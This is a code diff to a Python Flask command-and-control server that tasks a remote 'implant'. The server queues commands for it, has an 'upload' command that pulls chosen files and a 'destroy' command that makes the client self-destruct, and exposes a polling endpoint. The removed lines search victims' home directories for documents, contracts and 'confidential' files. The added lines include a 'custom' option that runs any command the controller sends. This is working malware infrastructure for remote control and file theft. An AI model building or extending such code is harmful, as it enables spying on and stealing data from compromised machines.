@@ -12,15 +12,17 @@ latest_result = None
 app = Flask(__name__)
 
 # Predefined command menu
+
+
 command_menu = {
-    0: "find /home -iname '*.doc*' -o -iname '*.odt' -o -iname '*.txt'",
-    1: "find /home -iname '*draft*' -o -iname '*report*'",
-    2: "find /home -iname '*contract*' -o -iname '*.pdf'",
-    3: "grep -ril 'confidential' /home",
-    4: 'upload', # Special non-Linux command that requests specific files
-    5: 'destroy', # Special non-Linux command that causes client to self-destruct
-    6: "ls -la" # For testing
+   0: "pwd",
+   1: "ls", #Command to list a specific working directory
+   2: "custom",
+   3: 'upload', # Special non-Linux command that requests specific files
+   4: 'destroy', # Special non-Linux command that causes client to self-destruct
+   5: "ls -la" # For testing
 }
+
 
 
 # Queue of tasks assigned to the implant
@@ -75,22 +77,37 @@ def send_public_key():
     return jsonify({"Success": "Yay"}), 200
 
 # A controller can invoke this endpoint to task the client
+
+# A controller can invoke this endpoint to task the client
 @app.route('/assign/<int:cmd_index>', methods=['POST'])
 def assign_command(cmd_index):
-    if 0 <= cmd_index < len(command_menu):
-        if cmd_index == 4:
+   if 0 <= cmd_index < len(command_menu):
+       if cmd_index == 3:
+           data = request.get_json()
+           path = data.get('path')
+           if not path:
+               return jsonify({"error": "Missing 'path'"}), 400
+           tasks.put(f"upload {path}")
+           return jsonify({"message": f"Queued upload: {path}"})
+       elif cmd_index == 1:
+           data = request.get_json()
+           path = data.get('path')
+           if not path:
+               return jsonify({"error": "Missing 'path'"}), 400
+           tasks.put("ls " + path)
+           return jsonify({"message": f"Queued upload: ls {path}"})
+       elif cmd_index == 2:
             data = request.get_json()
-            path = data.get('path')
-            if not path:
+            cmd = data.get('cmd')
+            if not cmd:
                 return jsonify({"error": "Missing 'path'"}), 400
-            tasks.put(f"upload {path}")
-            return jsonify({"message": f"Queued upload: {path}"})
-        else:
-            tasks.put(command_menu[cmd_index])
-            return jsonify({"message": f"Queued: {command_menu[cmd_index]}"})
-    else:
-        return jsonify({"error": "Bad Request"}), 400
-
+            tasks.put(cmd)
+            return jsonify({"message": f"Queued upload: {cmd}"})
+       else:
+           tasks.put(command_menu[cmd_index])
+           return jsonify({"message": f"Queued: {command_menu[cmd_index]}"})
+   else:
+       return jsonify({"error": "Bad Request"}), 400
 
 # Implant periodically polls this endpoint to get a task
 @app.route('/feed.com', methods=['GET'])
